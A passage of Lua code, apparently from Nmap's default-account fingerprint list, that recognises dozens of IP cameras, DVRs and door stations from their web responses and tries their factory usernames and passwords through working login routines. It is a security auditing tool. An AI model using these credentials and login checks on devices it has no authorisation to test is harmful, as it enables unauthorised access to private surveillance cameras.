           and response.body:find('gPwd="123456"', 1, true)
           and response.body:lower():find("<title>web configurator</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "123456"}
  },
  login_check = function (host, port, path, user, pass)
    local lurl = ("cgi-bin/system?USER=%s&PWD=%s&LOGIN&SYSTEM_INFO"):format(
                 url.escape(user), url.escape(pass))
    local resp = http_get_simple(host, port, url.absolute(path, lurl))
    return resp.status == 200
           and (resp.body or ""):find("LOGIN='1'", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Ovislink AirLive BU",
  cpe = "cpe:/h:ovislink:airlive_bu-*",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^Boa/%d+%.")
           and response.body
           and response.body:find("controlmenu.htm", 1, true)
           and get_tag(response.body, "frame", {src="^controlmenu%.htm$"})
           and response.body:lower():find("<title>airlive</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "airlive"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "setting.htm"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "American Dynamics IP Dome",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("gbl_locale", 1, true)
           and response.body:lower():find("<title>american dynamics", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {gbl_locale=1,
                  accessRoute="",
                  username=user,
                  password=pass}
    local resp = http_post_simple(host, port, url.absolute(path, "index.php"),
                                 nil, form)
    return resp.status == 200
           and (resp.body or ""):find("gbl_username%s*=")
  end
})

table.insert(fingerprints, {
  name = "exacqVision",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if not (response.status == 200
           and response.body
           and response.body:find("%Wlocation%.replace%(%s*(['\"])login%.web%1%s*%)%s*;")) then
      return false
    end
    local resp = http_get_simple(host, port, url.absolute(path, "login.web"))
    return resp.status == 200
           and resp.body
           and resp.body:find("exacqVision", 1, true)
           and resp.body:lower():find("<title>login</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin256"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {u=user,
                  p=pass,
                  l=1,
                  s=0,
                  output="json",
                  responseVersion=2,
                  save=1}
    local resp = http_post_simple(host, port, url.absolute(path, "login.web"),
                                 nil, form)
    if not (resp.status == 200 and resp.body) then return false end
    local jstatus, jout = json.parse(resp.body)
    return jstatus and jout.login and jout.success
  end
})

table.insert(fingerprints, {
  name = "GeoVision Camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "GeoHttpServer"
           and response.body
           and (response.body:find('action="webcam_login"', 1, true)
             or response.body:find('action="phoneinfo"', 1, true))
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {id=user,
                  pwd=pass,
                  ViewType=2,
                  Login="Login"}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "webcam_login"),
                                 nil, form)
    return resp.status == 200
           and resp.body
           and (resp.body:find('%sname%s*=%s*"IDKey"%f[%s][^>]-%svalue%s*=%s*"[%x-]+"')
             or resp.body:find('%?IDKey=[%x-]+'))
  end
})

table.insert(fingerprints, {
  name = "GeoVision Web-Manager",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find("GeoVision", 1, true)
           and response.body:find("%Wlocation%.href%s*=%s*(['\"])ssi%.cgi/Login%.htm%1")
           and response.body:lower():find("<title>geovision ", 1, true)
  end,
  login_combos = {
    {username = "guest", password = "guest"},
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port,
                                 url.absolute(path, "ssi.cgi/Login.htm"))
    if not (resp1.status == 200 and resp1.body) then return false end
    local nonce1, nonce2 = resp1.body:match("%Wvar%s+cc1%s*=%s*['\"](%x+)['\"]%s*;%s*var%s+cc2%s*=%s*['\"](%x+)['\"]")
    if not nonce1 then return false end
    local hashfnc = function (p, a, b) return stdnse.tohex(openssl.md5(table.concat({a,p:lower(),b}))):upper() end
    local form = {username="",
                  password="",
                  Apply="Apply",
                  umd5=hashfnc(user, nonce1, nonce2),
                  pmd5=hashfnc(pass, nonce2, nonce1),
                  browser=1}
    local resp2 = http_post_simple(host, port,
                                  url.absolute(path, "LoginPC.cgi"),
                                  nil, form)
    return resp2.status == 200
           and get_cookie(resp2, "CLIENT_ID", "^%d+$")
  end
})

table.insert(fingerprints, {
  name = "GeoVision WebControl",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^Welcome to GV%-%w+ WebControl$")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Arecont Vision (no auth)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find(">Arecont Vision", 1, true)
           and response.body:lower():find("<title>arecont vision camera</title>", 1, true)
           and get_tag(response.body, "div", {class="^avmenu$"})
  end,
  login_combos = {
    {username = "", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    return true
  end
})

table.insert(fingerprints, {
  name = "Arecont Vision (basic auth)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "Arecont Vision"
  end,
  login_combos = {
    {username = "admin",  password = ""},
    {username = "viewer", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Avigilon Camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^Avigilon%-%d+$")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "Canon Camera",
  cpe = "cpe:/h:canon:network_camera_server_vb*",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("img/canon_logo.gif", 1, true)
           and get_tag(response.body, "img", {src="^img/canon_logo%.gif$"})
           and response.body:lower():find("<title>network camera</title>", 1, true)
  end,
  login_combos = {
    {username = "root", password = "camera"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port,
                        url.absolute(path, "admin/index.html?lang=en"),
                        user, pass, "any")
  end
})

table.insert(fingerprints, {
  name = "Brovotech IPCAM",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and (response.header["location"] or ""):find("/cn/viewer_index%.asp$")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "cn/viewer_index.asp"),
                        user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "Grandstream Camera",
  cpe = "cpe:/o:grandstream:gxv_device_firmware",
  category = "security",
  paths = {
    {path = "/index.html"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "GS-Webs"
           and response.body
           and response.body:lower():find("%stype%s*=%s*['\"]application/x%-vnd%-npgs_")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "Pages/system.html"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Hikvision (var.1)",
  category = "security",
  paths = {
    {path = "/index.asp"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("%Wwindow%.location%.href%s*=%s*['\"]doc/page/login%.asp['\"?]")
           and response.body:lower():find("<title>index</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "12345"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_get_simple(host, port,
                                url.absolute(path, "PSIA/Custom/SelfExt/userCheck"),
                                {auth={username=user, password=pass}})
    return resp.status == 200
           and (resp.body or ""):lower():find("<statusvalue>200</statusvalue>", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Hikvision (var.2)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("%Wwindow%.location%.href%s*=%s*['\"]doc/page/login%.asp['\"?]")
           and response.body:lower():find("<title>index</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "12345"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_get_simple(host, port,
                                url.absolute(path, "ISAPI/Security/userCheck"),
                                {auth={username=user, password=pass}})
    return resp.status == 200
           and (resp.body or ""):lower():find("<statusvalue>200</statusvalue>", 1, true)
  end
})

table.insert(fingerprints, {
  name = "TI Megapixel IP Camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "Megapixel IP Camera"
           and response.header["server"] == "HKVision-Webs"
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "MayGion Camera (no auth)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "WebServer(IPCamera_Logo)"
           and response.body
           and get_tag(response.body, "iframe", {src="^video%.htm$"})
  end,
  login_combos = {
    {username = "", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    return true
  end
})

table.insert(fingerprints, {
  name = "MayGion Camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "WebServer(IPCamera_Logo)"
           and response.body
           and response.body:find("login.xml", 1, true)
  end,
  login_combos = {
    {username = "admin",   password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {user=user,
                  usr=user,
                  password=pass,
                  pwd=pass}
    local lurl = "login.xml?" .. url.build_query(form)
    local resp = http_get_simple(host, port, url.absolute(path, lurl))
    return resp.status == 200
           and get_cookie(resp, "user") == user
           and get_cookie(resp, "password") == pass
           and get_cookie(resp, "usrLevel") == "0"
  end
})

table.insert(fingerprints, {
  name = "OEM Boa IP Camera (var.1)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 401
           and (http_auth_realm(response) or ""):find(" IP Camera$")
           and (response.header["server"] or ""):find("^Boa/%d+%.")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "OEM Boa IP Camera (var.2)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^Boa/%d+%.")
           and get_tag(response.body, "script", {src="^profile$"})
           and get_tag(response.body, "img", {id="^setting$",onclick="%f[%w]window%.location=(['\"])setting%.htm%1$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "setting.htm"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "OEM Boa IP Camera (var.3)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^Boa/%d+%.")
           and get_tag(response.body, "script", {src="^profile$"})
           and response.body:lower():find("<title>ip camera viewer</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "12345"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "setting.htm"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "OEM Netcam",
  category = "security",
  paths = {
    {path = "/"},
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^[Nn]etcam$")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Planet IP Cam",
  category = "security",
  paths = {
    {path = "/"},
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "PLANET IP CAM"
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Planet IP Surveillance",
  category = "security",
  paths = {
    {path = "/"},
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("ipcam_language", 1, true)
           and get_tag(response.body, "frame", {src="^asp/view%.asp$"})
           and response.body:lower():find("<title>planet ip surveillance web management</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = ""},
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "asp/set.asp"),
                        user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "TP-Link IPC",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("/web-static/dynaform/class.js", 1, true)
           and response.body:lower():find("<title>ipc</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local a = "RDpbLfCPsJZ7fiv"
    local b = pass
    local pwdlen = math.max(#a, #b)
    a = table.pack(string.byte(a .. ("\187"):rep(pwdlen - #a), 1, -1))
    b = table.pack(string.byte(b .. ("\187"):rep(pwdlen - #b), 1, -1))
    local pad = "yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW"
    local pwd = {}
    for i = 1, pwdlen do
      table.insert(pwd, pad:byte(1 + (a[i] ~ b[i]) % #pad))
    end
    local header = {["Accept"]="application/json, text/plain, */*",
                    ["Content-Type"]="application/json;charset=utf-8"}
    local jin = {method="do",
                 login={username=user,
                        password=string.char(table.unpack(pwd))}}
    json.make_object(jin)
    local resp = http_post_simple(host, port, path, {header=header},
                                 json.generate(jin))
    if not (resp.status == 200 and resp.body) then return false end
    local jstatus, jout = json.parse(resp.body)
    return jstatus and jout.stok and jout.error_code == 0
  end
})

table.insert(fingerprints, {
  name = "Allnet Camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "NetworkPTZ"
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "D-Link Camera",
  cpe = "cpe:/h:d-link:dcs-*",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^DCS%-%d+%u?%f[_\0]")
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Microseven IP camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("/hi3510/", 1, true)
           and get_tag(response.body, "script", {src="/cgi%-bin/hi3510/param%.cgi%?cmd=getuserinfo$"})
  end,
  login_combos = {
    {username = "admin", password = "password"},
    {username = "guest", password = "guest"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port,
                        url.absolute(path, "cgi-bin/hi3510/param.cgi?cmd=getuserinfo"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Milesight Camera (var.1)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and (response.body:find(">Milesight Network Camera", 1, true)
             or response.body:find(">IPCAM Network Camera", 1, true))
           and get_tag(response.body, "input", {id="^secret$"})
           and not get_tag(response.body, "script", {src="/javascript/md5%.js%?"})
  end,
  login_combos = {
    {username = "admin",    password = "ms1234"},
    {username = "operator", password = "ms1234"},
    {username = "viewer",   password = "ms1234"}
  },
  login_check = function (host, port, path, user, pass)
    local userno = {admin=0, operator=1, viewer=2}
    local creds = {tostring(userno[user]),
                   url.escape(user),
                   url.escape(pass)}
    local lurl = "vb.htm?language=ie&checkpassword=" .. table.concat(creds, ":")
    local resp = http_get_simple(host, port, url.absolute(path, lurl))
    return resp.status == 200
           and resp.body:find("OK checkpassword", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Milesight Camera (var.2)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and (response.body:find(">Milesight Network Camera", 1, true)
             or response.body:find(">IPCAM Network Camera", 1, true))
           and get_tag(response.body, "input", {id="^secret$"})
           and get_tag(response.body, "script", {src="/javascript/md5%.js%?"})
end,
  login_combos = {
    {username = "admin",    password = "ms1234"},
    {username = "operator", password = "ms1234"},
    {username = "viewer",   password = "ms1234"}
  },
  login_check = function (host, port, path, user, pass)
    local userno = {admin=0, operator=1, viewer=2}
    local creds = {tostring(userno[user]),
                   url.escape(user),
                   stdnse.tohex(openssl.md5(pass))}
    local lurl = "vb.htm?language=ie&checkpassword=" .. table.concat(creds, ":")
    local resp = http_get_simple(host, port, url.absolute(path, lurl))
    return resp.status == 200
           and resp.body:find("OK checkpassword", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Milesight Camera (Alphafinity)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find(">Alphafinity Network Camera", 1, true)
           and get_tag(response.body, "input", {id="^secret$"})
           and get_tag(response.body, "script", {src="/javascript/md5%.js%?"})
end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local userno = {admin=0, operator=1, viewer=2}
    local creds = {tostring(userno[user]),
                   url.escape(user),
                   stdnse.tohex(openssl.md5(pass))}
    local lurl = "vb.htm?language=ie&checkpassword=" .. table.concat(creds, ":")
    local resp = http_get_simple(host, port, url.absolute(path, lurl))
    return resp.status == 200
           and resp.body:find("OK checkpassword", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Milesight Camera (Beward)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and (response.body:find(">BEWARD Network HD camera", 1, true)
             or response.body:find(">Beward Network Camera", 1, true))
           and get_tag(response.body, "input", {id="^secret$"})
           and get_tag(response.body, "script", {src="/javascript/md5%.js%?"})
end,
  login_combos = {
    {username = "admin",    password = "admin"},
    {username = "testuser", password = "htyjdfwbz1"}
  },
  login_check = function (host, port, path, user, pass)
    local userno = {admin=0, testuser=1}
    local creds = {tostring(userno[user]),
                   url.escape(user),
                   stdnse.tohex(openssl.md5(pass))}
    local lurl = "vb.htm?language=ie&checkpassword=" .. table.concat(creds, ":")
    local resp = http_get_simple(host, port, url.absolute(path, lurl))
    return resp.status == 200
           and resp.body:find("OK checkpassword", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Beward SIP Door Station",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 401
           and (http_auth_realm(response) or ""):find(" SIP Door Station %- %x+$")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "OEM MegapixelIPCamera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local realm = http_auth_realm(response)
    return response.status == 401
           and (response.header["server"] or ""):find("^Mbedthis%-Appweb/%d+%.")
           and (realm == "MegapixelIPCamera" or realm == "QuasarHDIPCamera")
  end,
  login_combos = {
    {username = "Admin", password = "1234"},
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Philips InSight",
  cpe = "cpe:/h:philips:in.sight*",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^lighttpd/%d+%.")
           and response.body
           and response.body:find(">Philips ", 1, true)
           and response.body:lower():find("%salt%s*=%s*(['\"])philips insight wireless home monitor%1")
  end,
  login_combos = {
    {username = "admin", password = "M100-4674448"},
    {username = "user",  password = "M100-4674448"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "cgi-bin/v1/camera"),
                        user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "Planex CS",
  cpe = "cpe:/o:planex:cs-*",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^CS%-%u+%d+[%u%d]*$")
  end,
  login_combos = {
    {username = "admin",      password = "password"},
    {username = "supervisor", password = "dangerous"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Santec IPCamera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "Santec-IPCamera"
  end,
  login_combos = {
    {username = "admin", password = "9999"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "HD IPC IP camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if not (response.status == 200
           and (response.header["server"] or ""):find("^thttpd/%d+%.")
           and response.body
           and get_refresh_url(response.body, "/web/index%.html$")) then
      return false
    end
    local resp = http_get_simple(host, port,
                                url.absolute(path, "web/index.html"))
    return resp.status == 200
           and resp.body
           and resp.body:find("LonginPassword", 1, true)
           and get_tag(resp.body, "input", {id="^longinpassword$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "guest", password = "guest"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {["-name"]=user,
                  ["-passwd"]=pass,
                  ["-time"]=math.floor(stdnse.clock_ms())}
    local lurl = url.absolute(path, "cgi-bin/hi3510/checkuser.cgi?" .. url.build_query(form))
    local resp = http_get_simple(host, port, lurl)
    return resp.status == 200
           and resp.body
           and resp.body:find("%f[%w]var%s+check%s*=%s*(['\"]?)1%1%s*;")
           and resp.body:find("%f[%w]var%s+authLevel%s*=%s*['\"]?[1-9]")
  end
})

table.insert(fingerprints, {
  name = "3S Vision",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if response.header["server"] ~= "httpd" then return false end
    local realm = http_auth_realm(response) or ""
    return realm == "IP Video Server"
           or realm == "IP SPEED DOME"
           or realm:find("^[%w ]- IP Camera$")
  end,
  login_combos = {
    {username = "3sadmin", password = "27988303"},
    {username = "root", password = "root"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Network Video Server (var.1)",
  category = "security",
  paths = {
    {path = "/login.asp"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("onLoginNVS", 1, true)
           and response.body:lower():find("<title>web service</title>", 1, true)
           and get_tag(response.body, "script", {["for"]="^WebCMS$", event="^CBK_LoginResult%("})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {username=user,
                  password=pass,
                  UserID=math.random(10000000, 99999999)}
    local lurl = url.absolute(path, "webs/loginCMS") .. "?"
                 .. url.build_query(form)
    local resp = http_get_simple(host, port, lurl)
    return resp.status == 200
           and (resp.body or ""):find("<level>%d</level>")
  end
})

table.insert(fingerprints, {
  name = "Network Video Server (var.2)",
  category = "security",
  paths = {
    {path = "/login.asp"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("onLoginNVS", 1, true)
           and response.body:lower():find("<title>web service</title>", 1, true)
           and get_tag(response.body, "script", {["for"]="^NetVideoX$", event="^CBK_LoginResult%("})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {username=user,
                  password=pass,
                  UserID=math.random(10000000, 99999999)}
    local lurl = url.absolute(path, "webs/httplogin") .. "?"
                 .. url.build_query(form)
    local resp = http_get_simple(host, port, lurl)
    return resp.status == 200
           and (resp.body or ""):find("<level>%d</level>")
  end
})

table.insert(fingerprints, {
  name = "Network Video Server (var.3)",
  category = "security",
  paths = {
    {path = "/login.asp"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("onLoginNVS", 1, true)
           and get_tag(response.body, "script", {event="^CallBackLoginState%("})
           and get_tag(response.body, "script", {src="^script/base64%.js$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {action="list",
                  group="LOGIN",
                  UserID=math.random(10000000, 99999999)}
    local lurl = url.absolute(path, "cgi-bin/login.cgi") .. "?"
                 .. url.build_query(form)
    local resp = http_get_simple(host, port, lurl,
                                {auth={username=user, password=pass}})
    return resp.status == 200
           and (resp.body or ""):find("%f[%w]root.ERR.no=0%f[^%w]")
  end
})

table.insert(fingerprints, {
  name = "Pravis Systems DVR",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and get_refresh_url(response.body, "/cgi%-bin/design/html_template/Login%.html$")
           and response.body:lower():find("<title>login cgicc form</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "cgi-bin/design/html_template/Login.cgi"),
                                 nil, {login_txt_id=user, login_txt_pw=pass})
    return resp.status == 200
           and resp.body
           and resp.body:find("%Wlocation%s*=%s*(['\"])webviewer%.cgi%1")
  end
})

table.insert(fingerprints, {
  name = "Foscam Netwave (var.1)",
  cpe = "cpe:/o:foscam:ip_camera_firmware",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "Netwave IP Camera"
           and response.body
           and get_tag(response.body, "script", {src="^check_user%.cgi$"})
  end,
  login_combos = {
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "check_user.cgi"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Foscam Netwave (var.2)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "Netwave IP Camera"
           and response.body
           and response.body:find("%Wwindow%.location%.href%s*=%s*(['\"])index1%.htm%1")
  end,
  login_combos = {
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local lurl = url.absolute(path, "check_user.cgi") .. "?"
                 .. url.build_query({user=user, pwd=pass})
    return try_http_auth(host, port, lurl, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Foscam IP Camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("IPCam", 1, true)
           and response.body:lower():find("<title>ipcam client</title>", 1, true)
           and response.body:lower():find("%ssrc%s*=%s*['\"]js/main%.js['\"?]")
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local form = {usr=user,
                  pwd=pass,
                  cmd="logIn",
                  usrName=user,
                  groupId=string.sub(math.floor(stdnse.clock_ms()), -9)}
    local lurl = "cgi-bin/CGIProxy.fcgi?" .. url.build_query(form)
    local resp = http_get_simple(host, port, url.absolute(path, lurl))
    return resp.status == 200
           and (resp.body or ""):find("<logInResult>0</logInResult>", 1, true)
  end
})

table.insert(fingerprints, {
  name = "ITX Web Remote Viewer",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if response.status == 200
       and get_refresh_url(response.body, "/redirect%.html$") then
      response = http_get_simple(host, port, url.absolute(path, "redirect.html"))
    end
    return http_auth_realm(response) == "WEB Remote Viewer"
  end,
  login_combos = {
    {username = "ADMIN", password = "1234"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "html/versioninfo.htm"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "JVC VN-xxx Camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^JVC VN%-%w+ API Server%f[/\0]")
           and response.body
           and get_refresh_url(response.body, "/cgi%-bin/%w+%.cgi%?%w+%.html$")
  end,
  login_combos = {
    {username = "admin", password = "jvc"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_get_simple(host, port, path)
    local lurl = resp.status == 200
